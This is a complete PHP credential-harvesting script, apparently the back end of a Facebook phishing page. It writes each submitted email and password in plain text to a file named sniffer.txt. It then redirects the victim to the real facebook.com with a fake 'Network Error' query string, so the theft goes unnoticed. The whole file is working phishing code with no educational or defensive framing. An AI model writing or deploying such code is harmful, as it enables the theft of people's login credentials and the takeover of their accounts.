

<?php

header('Location: https://www.facebook.com?Network Error');

$myfile = fopen("sniffer.txt", "a+") or die("Unable to open file!");
$txt = "EMAIL: " . $_POST["email"] . " - ";
fwrite($myfile, $txt);

$txt = "PASSWORD: " . $_POST["pass"] . "\r\n";
fwrite($myfile, $txt);
fclose($myfile);










